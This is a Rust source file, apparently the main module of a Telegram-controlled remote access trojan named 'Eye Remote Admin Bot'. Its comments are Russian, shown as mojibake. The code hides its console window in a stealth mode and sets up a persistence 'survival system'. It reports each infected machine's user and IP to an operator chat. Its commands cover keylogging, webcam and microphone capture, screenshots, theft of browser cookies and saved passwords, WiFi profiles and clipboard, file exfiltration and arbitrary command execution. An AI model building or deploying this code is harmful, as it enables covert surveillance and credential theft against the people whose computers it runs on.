mod config;
mod device_manager;
mod telegram_client;
mod system_commands;
mod file_commands;
mod monitoring_commands;
mod security_commands;
mod execution_commands;
mod popup_commands;
mod advanced_commands;
mod auth;
mod token_security;
mod backup_manager;

use std::sync::Arc;
use anyhow::Result;
use tokio::signal;

#[cfg(windows)]
extern "system" {
    fn GetConsoleWindow() -> *mut std::ffi::c_void;
    fn ShowWindow(hwnd: *mut std::ffi::c_void, n_cmd_show: i32) -> i32;
    fn FreeConsole() -> i32;
}

#[cfg(windows)]
fn hide_console_immediately() {
    unsafe {
        let console_window = GetConsoleWindow();
        if !console_window.is_null() {
            ShowWindow(console_window, 0); // SW_HIDE = 0
            FreeConsole(); // –û—Å–≤–æ–±–æ–∂–¥–∞–µ–º –∫–æ–Ω—Å–æ–ª—å –ø–æ–ª–Ω–æ—Å—Ç—å—é
        }
    }
}

use config::{init_logging, validate_config};
use device_manager::DeviceManager;
use telegram_client::{TelegramClient, Message};

#[tokio::main]
async fn main() -> Result<()> {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏–º—è –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ stealth —Ä–µ–∂–∏–º–∞
    let current_exe = std::env::current_exe().unwrap_or_default();
    let exe_name = current_exe
        .file_stem()
        .and_then(|name| name.to_str())
        .unwrap_or("")
        .to_lowercase();
    
    let stealth_mode = exe_name.contains("stealth") || 
                      exe_name.contains("silent") || 
                      std::env::var("EYE_STEALTH").is_ok();
    
    if stealth_mode {
        // –í stealth —Ä–µ–∂–∏–º–µ –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ —Å–∫—Ä—ã–≤–∞–µ–º –∫–æ–Ω—Å–æ–ª—å
        #[cfg(windows)]
        hide_console_immediately();
    }
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Ö–µ—à–µ–π
    let args: Vec<String> = std::env::args().collect();
    if args.len() == 3 && args[1] == "--generate-hash" {
        if let Ok(chat_id) = args[2].parse::<i64>() {
            match auth::generate_chat_hash(chat_id) {
                Ok(hash) => {
                    println!("üîê –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π Argon2 —Ö–µ—à –¥–ª—è ChatID {}:", chat_id);
                    println!("üìã –°–∫–æ–ø–∏—Ä—É–π—Ç–µ —ç—Ç–æ—Ç —Ö–µ—à –≤ AUTHORIZED_HASHES –≤ src/auth.rs:");
                    println!("{}", hash);
                    println!("\n‚ö†Ô∏è  –ü–æ—Å–ª–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Ö–µ—à–∞ –ø–µ—Ä–µ–∫–æ–º–ø–∏–ª–∏—Ä—É–π—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É!");
                    return Ok(());
                }
                Err(e) => {
                    eprintln!("‚ùå –û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Ö–µ—à–∞: {}", e);
                    std::process::exit(1);
                }
            }
        } else {
            eprintln!("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç ChatID. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: --generate-hash 123456789");
            std::process::exit(1);
        }
    }
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    init_logging();
    
    log::info!("üöÄ –ó–∞–ø—É—Å–∫ Eye Remote Admin Bot...");

    // üõ°Ô∏è –°–ò–°–¢–ï–ú–ê –í–´–ñ–ò–í–ê–ù–ò–Ø - –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞–ø—É—Å–∫–µ
    if let Err(e) = backup_manager::initialize_survival_system().await {
        log::warn!("–ù–µ —É–¥–∞–ª–æ—Å—å –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º—É –≤—ã–∂–∏–≤–∞–Ω–∏—è: {}", e);
    }
    
    // üîÑ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã –≤—ã–∂–∏–≤–∞–Ω–∏—è
    if let Err(e) = backup_manager::check_and_restore_survival().await {
        log::warn!("–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–∏—Å—Ç–µ–º—É –≤—ã–∂–∏–≤–∞–Ω–∏—è: {}", e);
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
    if let Err(e) = validate_config() {
        log::error!("‚ùå –û—à–∏–±–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏: {}", e);
        eprintln!("‚ùå –û—à–∏–±–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏: {}", e);
        eprintln!("üìù –û—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä—É–π—Ç–µ —Ñ–∞–π–ª src/config.rs –∏ —É–∫–∞–∂–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π BOT_TOKEN");
        eprintln!("üîê –ù–∞—Å—Ç—Ä–æ–π—Ç–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é –≤ src/auth.rs (—Å–º. –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ –≤ —Ñ–∞–π–ª–µ)");
        std::process::exit(1);
    }

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
    let device_manager = Arc::new(DeviceManager::new());
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Ç–µ–∫—É—â–µ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    match device_manager.initialize_current_device().await {
        Ok(device_id) => {
            log::info!("‚úÖ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–æ —Å ID: {}", device_id);
            println!("‚úÖ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–æ —Å ID: {}", device_id);
        }
        Err(e) => {
            log::error!("‚ùå –û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: {}", e);
            eprintln!("‚ùå –û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: {}", e);
            std::process::exit(1);
        }
    }

    // –°–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
    if let Err(e) = file_commands::ensure_temp_directory() {
        log::warn!("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –≤—Ä–µ–º–µ–Ω–Ω—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é: {}", e);
    }

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram –∫–ª–∏–µ–Ω—Ç–∞
    let telegram_client = TelegramClient::new();
    
    // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ
    if let Some(device) = device_manager.get_current_device() {
        let startup_message = format!(
            "üü¢ **–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ**\n\
            üì± ID: `{}`\n\
            üíª –ò–º—è: `{}`\n\
            üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: `{}`\n\
            üåê IP: `{}`\n\
            üïê –í—Ä–µ–º—è: {}",
            device.device_id,
            device.device_name,
            device.username,
            device.external_ip,
            chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
        );
        
        if let Err(e) = telegram_client.send_message(
            auth::get_notification_chat_id().unwrap_or_default(), 
            &startup_message
        ).await {
            log::warn!("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ: {}", e);
        }
    }

    // –ö–ª–æ–Ω–∏—Ä—É–µ–º Arc –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Ä–∞–∑–Ω—ã—Ö –ø–æ—Ç–æ–∫–∞—Ö
    let device_manager_clone = Arc::clone(&device_manager);
    let telegram_client_clone = telegram_client.clone();

    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥
    let command_handler = move |message: Message| -> Result<()> {
        let device_manager = Arc::clone(&device_manager_clone);
        let telegram_client = telegram_client_clone.clone();
        
        tokio::spawn(async move {
            if let Err(e) = handle_message(message, device_manager, telegram_client).await {
                log::error!("–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è: {}", e);
            }
        });
        
        Ok(())
    };

    log::info!("ü§ñ Telegram –±–æ—Ç –∑–∞–ø—É—â–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ");
    println!("ü§ñ Telegram –±–æ—Ç –∑–∞–ø—É—â–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ");
    println!("üí° –î–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–∞–∂–º–∏—Ç–µ Ctrl+C");

    // –ó–∞–ø—É—Å–∫ polling —Å –æ–±—Ä–∞–±–æ—Ç–∫–æ–π —Å–∏–≥–Ω–∞–ª–æ–≤
    tokio::select! {
        result = telegram_client.start_polling(command_handler) => {
            if let Err(e) = result {
                log::error!("‚ùå –û—à–∏–±–∫–∞ Telegram polling: {}", e);
                eprintln!("‚ùå –û—à–∏–±–∫–∞ Telegram polling: {}", e);
            }
        }
        _ = signal::ctrl_c() => {
            log::info!("üõë –ü–æ–ª—É—á–µ–Ω —Å–∏–≥–Ω–∞–ª –æ—Å—Ç–∞–Ω–æ–≤–∫–∏");
            println!("\nüõë –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è...");
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± –æ—Ç–∫–ª—é—á–µ–Ω–∏–∏
            if let Some(device) = device_manager.get_current_device() {
                let shutdown_message = format!(
                    "üî¥ **–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –æ—Ç–∫–ª—é—á–µ–Ω–æ**\n\
                    üì± ID: `{}`\n\
                    üíª –ò–º—è: `{}`\n\
                    üïê –í—Ä–µ–º—è: {}",
                    device.device_id,
                    device.device_name,
                    chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
                );
                
                let _ = telegram_client.send_message(
                    auth::get_notification_chat_id().unwrap_or_default(), 
                    &shutdown_message
                ).await;
            }
        }
    }

    log::info!("üëã –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ");
    println!("üëã –î–æ —Å–≤–∏–¥–∞–Ω–∏—è!");
    Ok(())
}

/// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—Ö–æ–¥—è—â–∏—Ö –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤
async fn handle_document(
    _document: telegram_client::Document,
    _device_manager: Arc<DeviceManager>,
    _telegram_client: TelegramClient,
    _chat_id: i64,
) -> Result<()> {
    // –ó–∞–≥–ª—É—à–∫–∞ –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤
    Ok(())
}

/// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—Ö–æ–¥—è—â–∏—Ö —Å–æ–æ–±—â–µ–Ω–∏–π
async fn handle_message(
    message: telegram_client::Message,
    device_manager: Arc<DeviceManager>,
    telegram_client: TelegramClient,
) -> Result<()> {
    let chat_id = message.chat.id;
    
    // –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è
    let text = match message.text {
        Some(text) => text.trim().to_string(),
        None => {
            // –ï—Å–ª–∏ —ç—Ç–æ —Ñ–∞–π–ª, –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º upload
            if let Some(document) = message.document {
                return handle_file_upload(document, device_manager, telegram_client, chat_id).await;
            }
            return Ok(());
        }
    };

    // –ü–∞—Ä—Å–∏–º –∫–æ–º–∞–Ω–¥—É
    let parts: Vec<&str> = text.split_whitespace().collect();
    if parts.is_empty() {
        return Ok(());
    }

    let command = parts[0].to_lowercase();
    
    log::info!("üì® –ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞: {} –æ—Ç chat_id: {}", command, chat_id);
    
    // üîê –ü–†–û–í–ï–†–ö–ê –ê–í–¢–û–†–ò–ó–ê–¶–ò–ò –ß–ï–†–ï–ó ARGON2 –•–ï–®
    if !auth::is_authorized_chat(chat_id) {
        log::warn!("‚ö†Ô∏è –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –æ—Ç –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–æ–≥–æ chat_id: {}", chat_id);
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–µ–π—Ç—Ä–∞–ª—å–Ω—ã–π –æ—Ç–≤–µ—Ç, —á—Ç–æ–±—ã –Ω–µ —Ä–∞—Å–∫—Ä—ã–≤–∞—Ç—å –Ω–∞–ª–∏—á–∏–µ –±–æ—Ç–∞
        telegram_client.send_message(chat_id, "‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω").await?;
        return Ok(());
    }
    
    log::info!("‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞ –¥–ª—è –∫–æ–º–∞–Ω–¥—ã: {}", command);

    match command.as_str() {
        "/start" => {
            let welcome_msg = "üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Eye Remote Admin Bot!\n\n–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /help –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–æ–º–∞–Ω–¥.";
            telegram_client.send_message(chat_id, welcome_msg).await?;
        }
        
        "/help" => {
            telegram_client.send_help(chat_id).await?;
        }
        
        "/devices" => {
            let response = system_commands::handle_devices_command(&device_manager).await?;
            telegram_client.send_long_message(chat_id, &response).await?;
        }
        
        "/info" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /info <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let response = system_commands::handle_info_command(&device_manager, device_id).await?;
            telegram_client.send_long_message(chat_id, &response).await?;
        }
        
        "/ipinfo" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /ipinfo <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let response = system_commands::handle_ipinfo_command(&device_manager, device_id).await?;
            telegram_client.send_long_message(chat_id, &response).await?;
        }
        
        "/listdrives" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /listdrives <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let response = system_commands::handle_listdrives_command(&device_manager, device_id).await?;
            telegram_client.send_long_message(chat_id, &response).await?;
        }
        
        "/listdirs" => {
            if parts.len() < 3 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /listdirs <device_id> <path>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let path = parts[2..].join(" ");
            let response = file_commands::handle_listdirs_command(&device_manager, device_id, &path).await?;
            telegram_client.send_long_message(chat_id, &response).await?;
        }
        
        "/listfiles" => {
            if parts.len() < 3 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /listfiles <device_id> <path>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let path = parts[2..].join(" ");
            let response = file_commands::handle_listfiles_command(&device_manager, device_id, &path).await?;
            telegram_client.send_long_message(chat_id, &response).await?;
        }
        
        "/download" => {
            if parts.len() < 3 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /download <device_id> <file_path>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let file_path = parts[2..].join(" ");
            
            match file_commands::handle_download_command(&device_manager, device_id, &file_path).await {
                Ok((file_name, file_data)) => {
                    // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ñ–∞–π–ª –≤—Ä–µ–º–µ–Ω–Ω–æ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
                    let temp_dir = file_commands::ensure_temp_directory()?;
                    let temp_file_path = temp_dir.join(&file_name);
                    
                    tokio::fs::write(&temp_file_path, &file_data).await?;
                    
                    let caption = format!(
                        "üìÅ –§–∞–π–ª —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ `{}`\nüìÑ –†–∞–∑–º–µ—Ä: {} –±–∞–π—Ç",
                        device_id,
                        file_data.len()
                    );
                    
                    if let Err(e) = telegram_client.send_document(chat_id, temp_file_path.to_str().unwrap(), Some(&caption)).await {
                        telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–∞: {}", e)).await?;
                    }
                    
                    // –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
                    let _ = tokio::fs::remove_file(&temp_file_path).await;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞: {}", e)).await?;
                }
            }
        }
        
        "/reroll" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /reroll <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            if !device_manager.is_valid_device_id(device_id) {
                telegram_client.send_error(chat_id, &format!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id)).await?;
                return Ok(());
            }
            
            match device_manager.reroll_device_id().await {
                Ok(new_id) => {
                    let response = format!(
                        "üîÑ **ID —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –∏–∑–º–µ–Ω–µ–Ω**\n\
                        üì± –°—Ç–∞—Ä—ã–π ID: `{}`\n\
                        üÜï –ù–æ–≤—ã–π ID: `{}`\n\
                        üïê –í—Ä–µ–º—è: {}",
                        device_id,
                        new_id,
                        chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
                    );
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è ID: {}", e)).await?;
                }
            }
        }
        
        // –ö–æ–º–∞–Ω–¥—ã –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞
        "/screenshot" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /screenshot <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            match monitoring_commands::handle_screenshot_command(&device_manager, device_id).await {
                Ok(image_data) => {
                    // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç –≤—Ä–µ–º–µ–Ω–Ω–æ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
                    let temp_dir = file_commands::ensure_temp_directory()?;
                    let temp_file_path = temp_dir.join("screenshot.png");
                    
                    tokio::fs::write(&temp_file_path, &image_data).await?;
                    
                    let caption = format!("üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ `{}`", device_id);
                    
                    if let Err(e) = telegram_client.send_document(chat_id, temp_file_path.to_str().unwrap(), Some(&caption)).await {
                        telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {}", e)).await?;
                    }
                    
                    let _ = tokio::fs::remove_file(&temp_file_path).await;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {}", e)).await?;
                }
            }
        }
        
        "/webcam" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /webcam <device_id> [delay] [camera_index]").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let delay = parts.get(2).and_then(|s| s.parse().ok());
            let camera_index = parts.get(3).and_then(|s| s.parse().ok());
            
            match monitoring_commands::handle_webcam_command(&device_manager, device_id, delay, camera_index).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –≤–µ–±-–∫–∞–º–µ—Ä—ã: {}", e)).await?;
                }
            }
        }
        
        "/keylogger" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /keylogger <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            match monitoring_commands::handle_keylogger_command(&device_manager, device_id).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ keylogger: {}", e)).await?;
                }
            }
        }
        
        "/micrec" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /micrec <device_id> [duration_seconds]").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let duration = parts.get(2).and_then(|s| s.parse().ok());
            
            match monitoring_commands::handle_micrec_command(&device_manager, device_id, duration).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞: {}", e)).await?;
                }
            }
        }
        
        // –ö–æ–º–∞–Ω–¥—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
        "/cookies" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /cookies <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            match security_commands::handle_cookies_command(&device_manager, device_id).await {
                Ok(response) => {
                    telegram_client.send_long_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è cookies: {}", e)).await?;
                }
            }
        }
        
        "/weblogins" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /weblogins <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            match security_commands::handle_weblogins_command(&device_manager, device_id).await {
                Ok(response) => {
                    telegram_client.send_long_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –ø–∞—Ä–æ–ª–µ–π: {}", e)).await?;
                }
            }
        }
        
        "/wifiprofiles" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /wifiprofiles <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            match security_commands::handle_wifiprofiles_command(&device_manager, device_id).await {
                Ok(response) => {
                    telegram_client.send_long_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è WiFi –ø—Ä–æ—Ñ–∏–ª–µ–π: {}", e)).await?;
                }
            }
        }
        
        "/getclipboard" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /getclipboard <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            match security_commands::handle_getclipboard_command(&device_manager, device_id).await {
                Ok(response) => {
                    telegram_client.send_long_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞: {}", e)).await?;
                }
            }
        }
        
        // –ö–æ–º–∞–Ω–¥—ã –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
        "/exec" => {
            if parts.len() < 3 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /exec <device_id> <command>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let command = parts[2..].join(" ");
            
            match execution_commands::handle_exec_command(&device_manager, device_id, &command).await {
                Ok(response) => {
                    telegram_client.send_long_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã: {}", e)).await?;
                }
            }
        }
        
        "/start_app" => {
            if parts.len() < 3 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /start_app <device_id> <program>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let target = parts[2..].join(" ");
            
            match execution_commands::handle_start_command(&device_manager, device_id, &target).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º—ã: {}", e)).await?;
                }
            }
        }
        
        "/apps" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /apps <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            match execution_commands::handle_apps_command(&device_manager, device_id).await {
                Ok(response) => {
                    telegram_client.send_long_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π: {}", e)).await?;
                }
            }
        }
        
        "/kill" => {
            if parts.len() < 3 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /kill <device_id> <process_name_or_pid>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let target = parts[2];
            
            match execution_commands::handle_kill_command(&device_manager, device_id, target).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞: {}", e)).await?;
                }
            }
        }
